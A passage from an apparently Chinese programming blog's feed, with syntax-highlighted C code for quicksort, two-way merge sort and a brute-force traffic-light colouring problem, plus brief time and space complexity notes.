punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/*快速排序算法*/</span><span class="token keyword">void</span> <span class="token function">quick_sort</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> <span class="token keyword">int</span> high<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;</span> high<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> low<span class="token punctuation">,</span> j <span class="token operator">=</span> high<span class="token punctuation">;</span>        <span class="token keyword">int</span> k <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> j<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> k <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;</span> j<span class="token punctuation">)</span>                j<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> j<span class="token punctuation">)</span>                a<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> k <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;</span> j<span class="token punctuation">)</span>                i<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> j<span class="token punctuation">)</span>                a<span class="token punctuation">[</span>j<span class="token operator">--</span><span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> k<span class="token punctuation">;</span>        <span class="token function">quick_sort</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> low<span class="token punctuation">,</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">quick_sort</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> length<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入要排序的元素个数："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> a<span class="token punctuation">[</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入各元素的值："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"原顺序为："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">display</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">quick_sort</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"快速排序后的顺序为："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">display</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>快速排序的时间复杂度变化较大，在最坏的情况下yu冒泡排序一样，为$O(n^2)$，这种情况下每次比较都需要交换。平均时间复杂度和最优时间复杂度都是$O(n\log{n})$。</p><p>最优情况下的空间复杂度为$O(\log{n})$，最差情况下为$O(n)$。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 排序算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二路归并排序</title>
      <link href="2020/03/08/er-lu-gui-bing-pai-xu/"/>
      <url>2020/03/08/er-lu-gui-bing-pai-xu/</url>
      
        <content type="html"><![CDATA[<h2 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h2><p>二路归并排序的原理就是将一个数组分成两个数组，分别对两个数组进行排序，最后将两个数组合为一个数组完成排序。在这个过程中，涉及到了“分治算法”，使用了递归。</p><span id="more"></span><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">void</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> <span class="token keyword">int</span> mid<span class="token punctuation">,</span> <span class="token keyword">int</span> high<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> low<span class="token punctuation">,</span> j <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> k <span class="token operator">=</span> low<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">!=</span> mid <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> j <span class="token operator">!=</span> high <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&gt;</span> a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            b<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            b<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">!=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>        b<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">!=</span> high <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>        b<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> low<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> high<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">merge_sort</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> <span class="token keyword">int</span> high<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> mid<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;</span> high<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token function">merge_sort</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> low<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">merge_sort</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">merge</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> low<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> high<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> length<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入要排序元素的个数："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//int a[15] = {50, 10, 20, 30, 70, 40, 80, 60, 45, 66, 38, 29, 51,74, 13};</span>    <span class="token comment">//int i, b[15];</span>    <span class="token keyword">int</span> a<span class="token punctuation">[</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"输入要排序的数列："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> b<span class="token punctuation">[</span>length<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"原顺序为： \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">merge_sort</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n二路归并排序后的顺序为： \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>二路归并排序的时间复杂度为$O(n\log{n})$，空间复杂度为$O(n)$。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 排序算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>交通指挥灯问题求解（穷举法和贪心算法）</title>
      <link href="2020/03/01/jiao-tong-zhi-hui-deng-wen-ti-qiu-jie-qiong-ju-fa-he-tan-xin-suan-fa/"/>
      <url>2020/03/01/jiao-tong-zhi-hui-deng-wen-ti-qiu-jie-qiong-ju-fa-he-tan-xin-suan-fa/</url>
      
        <content type="html"><![CDATA[<p>问题描述：一个具有五条通路的交叉路口，当允许某些通路上的车辆在交叉路口通行时，必须对其他通路上的车辆加以限制，不许同时在交叉路口通行，以免发生碰撞。那么，如何建立一个模型来求出最少需要几种颜色的信号灯来控制通行？</p><span id="more"></span><p>这道题我们可以使用穷举法和贪心算法两种方法来解决。</p><h2 id="1-穷举法"><a href="#1-穷举法" class="headerlink" title="1. 穷举法"></a>1. 穷举法</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token keyword">int</span> e<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> v<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">hs</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span>    <span class="token comment">//从第k个灯开始尝试添加</span>    <span class="token comment">//递归出口</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>k <span class="token operator">==</span> <span class="token number">13</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n最少用灯%d个，方案："</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">13</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span> v<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> c<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment">//给第k个灯试验所有灯的颜色</span>        v<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token keyword">int</span> ok <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> k<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>v<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> v<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> e<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span> <span class="token comment">//有冲突</span>                ok <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ok<span class="token punctuation">)</span>            <span class="token function">hs</span><span class="token punctuation">(</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span 